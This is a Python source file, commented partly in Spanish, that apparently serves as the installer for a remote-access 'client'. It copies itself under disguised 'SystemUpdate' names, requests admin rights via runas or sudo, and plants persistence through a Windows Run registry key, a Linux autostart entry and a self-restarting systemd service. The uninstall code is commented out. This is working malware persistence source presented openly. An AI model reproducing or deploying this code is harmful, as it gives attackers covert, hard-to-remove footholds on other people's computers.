import ctypes
import os
import platform
import sys
import shutil
import subprocess
import getpass
import stat
import winreg

from config.config import  load_config, get_default_config, save_config


class ClientSetup:
    def __init__(self, client_script_path, persistence_name="system_update_service"):
        """
         constructor para la clase ClientSetup
        :param client_script_path: Path of the client script
        """
        if getattr(sys, 'frozen', False):
            # Si está compilado con PyInstaller
            self.client_script_path = sys.executable
        else:
            # Si se está ejecutando como script normal
            self.client_script_path = os.path.abspath(client_script_path)

        self.persistence_name = persistence_name
        self.os_type = platform.system().lower()

        # Load configuration or set default
        self.config = load_config()
        if not self.config:
            self.config = get_default_config()
            save_config(self.config)

        # Default installation paths
        self.installation_paths = {
            'windows': os.path.join(os.environ.get('APPDATA', ''), 'SystemUpdate'),
            'linux': '/opt/system_updates',
            'darwin': '/Library/Application Support/SystemUpdate'
        }

    def _require_admin(self):
        """Check if admin privileges are required for the current operation"""
        if self.os_type == 'windows':
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except Exception as e:
                print(f"Error: {e}")
                return False
        return os.geteuid() == 0

    def _elevate_privileges(self):
        """Intento de escalada de privelegios"""
        if not self._require_admin():
            if self.os_type == 'windows':
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit(0)
            elif self.os_type in ['linux', 'darwin']:
                os.execvp('sudo', ['sudo'] + sys.argv)

    def install(self, install_path=None, create_autostart=True, create_service=True):
        """
        Instalar el cliente y configurar la persistencia
        """
        if not self._require_admin():
            self._elevate_privileges()

        # Determine installation path
        install_path = install_path or self.installation_paths.get(self.os_type)

        # Create installation directory
        os.makedirs(install_path, exist_ok=True)

        # Copy client script to installation path
        target_script = os.path.join(install_path, os.path.basename(self.client_script_path))

        shutil.copy2(self.client_script_path, target_script)

        # Verifica si el archivo se ha copiado correctamente
        if not os.path.exists(target_script):
            print(f"Error: No se pudo copiar el script a {target_script}")

        # Set executable permissions
        os.chmod(target_script, stat.S_IEXEC)

        # Configure persistence mechanisms
        if create_autostart:
            self._create_autostart(target_script)

        if create_service:
            self._create_system_service(target_script)

        return {'status': 'success', 'path': target_script}

    def _create_autostart(self, script_path):
        """Creacion de autoinicio """
        if self.os_type == 'windows':
            # Modification del registro de Windows
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                    winreg.SetValueEx(key, self.persistence_name, 0, winreg.REG_SZ, script_path)
            except Exception as e:
                print(f"Autostart creation failed: {e}")

        elif self.os_type == 'linux':
            # Linux autostart via .desktop file
            autostart_dir = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_file = os.path.join(autostart_dir, f'{self.persistence_name}.desktop')

            desktop_content = f"""[Desktop Entry]
            Type=Application
            Name={self.persistence_name}
            Exec={script_path}
            Hidden=false
            NoDisplay=false
            X-GNOME-Autostart-enabled=true"""

            with open(desktop_file, 'w') as f:
                f.write(desktop_content)

    def _create_system_service(self, script_path):
        """Creacion de servicio en linux """
        if self.os_type == 'linux':
            service_file = f'/etc/systemd/system/{self.persistence_name}.service'
            service_content = f"""[Unit]
            Description={self.persistence_name} System Update Service
            After=network.target

            [Service]
            ExecStart={script_path}
            Restart=always
            User={getpass.getuser()}
            
            [Install]
            WantedBy=multi-user.target"""

            with open(service_file, 'w') as f:
                f.write(service_content)

            # Enable and start service
            subprocess.run(['systemctl', 'enable', f'{self.persistence_name}.service'], check=True)
            subprocess.run(['systemctl', 'start', f'{self.persistence_name}.service'], check=True)

    # def uninstall(self, remove_config=True):
    #     """
    #     Desinstalar el cliente y eliminar la persistencia
    #     :param remove_config: Configuracion para eliminar la persistencia
    #     :return: Exito de desinstalación
    #     """
    #     if not self._require_admin():
    #         self._elevate_privileges()
    #
    #     installation_path = self.installation_paths.get(self.os_type)
    #
    #
    #     if installation_path and os.path.exists(installation_path):
    #         shutil.rmtree(installation_path)
    #
    #
    #     if self.os_type == 'windows':
    #         try:
    #             key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    #             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
    #                 winreg.DeleteValue(key, self.persistence_name)
    #         except FileNotFoundError:
    #             pass
    #
    #     elif self.os_type == 'linux':
    #         # Remove autostart desktop file
    #         autostart_file = os.path.join(os.path.expanduser('~'), '.config', 'autostart',
    #                                       f'{self.persistence_name}.desktop')
    #         if os.path.exists(autostart_file):
    #             os.remove(autostart_file)
    #
    #
    #         subprocess.run(['systemctl', 'stop', f'{self.persistence_name}.service'], check=False)
    #         subprocess.run(['systemctl', 'disable', f'{self.persistence_name}.service'], check=False)
    #         service_file = f'/etc/systemd/system/{self.persistence_name}.service'
    #         if os.path.exists(service_file):
    #             os.remove(service_file)
    #
    #     return {'status': 'success', 'message': 'Client successfully uninstalled'}

    def detect_existing_installation(self):
        installation_path = self.installation_paths.get(self.os_type)

        if installation_path and os.path.exists(installation_path):
            script_path = os.path.join(installation_path, os.path.basename(self.client_script_path))

            if os.path.exists(script_path):
                return {
                    'installed': True,
                    'path': script_path,
                    'installed_at': os.path.getctime(script_path)
                }
            else:
                print(f"El script no se encontró en {script_path}")
                return {'installed': False}

        return {'installed': False}



if __name__ == "__main__":

    client_setup = ClientSetup(__file__)


    install_result = client_setup.install()

    installation_status = client_setup.detect_existing_installation()
    # Desinstalacion
    # uninstall_result = client_setup.uninstall()
